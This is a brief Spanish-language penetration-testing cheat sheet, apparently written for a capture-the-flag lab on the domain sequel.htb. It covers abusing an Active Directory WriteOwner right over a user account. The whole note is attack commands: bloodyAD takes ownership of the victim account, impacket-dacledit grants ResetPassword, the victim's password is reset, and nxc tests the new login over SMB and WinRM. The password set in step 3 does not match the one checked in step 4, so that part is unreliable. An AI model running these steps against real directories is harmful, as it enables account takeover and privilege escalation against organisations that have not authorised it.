# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket #BloodyAD 

## WriteOwner sobre Usuario 

```bash 
Paso 1:
# Cambiar propietario del usuario víctima a ControlledAccount
❯ bloodyAD -d sequel.htb -u ControlledAccount -p 'PASSWORD_RYAN' -H IP_DC set owner TargetUser ControlledAccount

	# TargetUser = Usuario víctima (Objetivo)
	# ControlledAccount = Usuario atacante (Controlas)

Paso 2:
# Dar a ryan el permiso ResetPassword sobre el usuario víctima
❯ impacket-dacledit -action write -rights ResetPassword -principal ControlledAccount -target TargetUser 'sequel.htb/ryan:PASSWORD_RYAN' -dc-ip IP_DC

Paso 3:
# Cambiar la contraseña del usuario víctima 
❯ bloodyAD -d sequel.htb -u ControlledAccount -p 'PASSWORD_RYAN' -H IP_DC set password TargetUser 'NuevaPassword123!'
```

```bash 
Paso 4:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u "TargetUser" -p "NewPass123!" 

# Verificar el ingreso por EvilWinRM
❯ nxc winrm IP_DC -u "TargetUser" -p "NewPass123!" 
```